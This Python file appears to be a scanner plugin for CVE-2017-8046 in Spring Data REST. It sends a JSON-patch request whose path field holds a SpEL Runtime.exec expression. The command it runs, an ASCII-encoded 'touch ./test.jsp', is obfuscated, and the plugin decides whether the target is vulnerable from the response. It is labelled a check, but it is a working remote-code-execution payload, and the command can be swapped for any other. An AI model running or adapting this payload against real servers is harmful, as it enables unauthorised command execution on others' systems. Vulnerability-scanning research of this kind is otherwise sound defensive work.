#!/usr/bin/env python3

import json
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2017_8046_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-8046漏洞',
            'description': 'CVE-2017-8046漏洞可执行任意命令,执行的命令：/usr/bin/touch ./test.jsp,利用小葵转ascii转换为47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112,影响范围为: Spring Data REST versions prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1)',
            'date': '2017-04-21',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers1 = {
            "User-Agent": get_useragent(),
            "Content-Type": "application/json",
            "Cache-Control": "no-cache"
        }
        self.headers2 = {
            "User-Agent": get_useragent(),
            "Content-Type": "application/json-patch+json",
            "Cache-Control": "no-cache"
        }
        self.data1 = {
            "firstName": "VulApps", 
            "lastName": "VulApps"
        }
        self.data2 = [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112}))/lastName", "value": "vulapps-demo" }]

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            response1 = await request.post(self.url + '/customers', headers = self.headers1, data = json.dumps(self.data1))
            response2 = await request.patch(self.url + '/customers/1', headers = self.headers2, data = json.dumps(self.data2))
            content2 = await response2.text()
            if 'maybe not public' in content2:
                return True
            
        except Exception as e:
            # print(e)
            pass
        
if __name__ == '__main__':
    CVE_2017_8046 = CVE_2017_8046_BaseVerify('http://192.168.30.242:8086')
    CVE_2017_8046.check()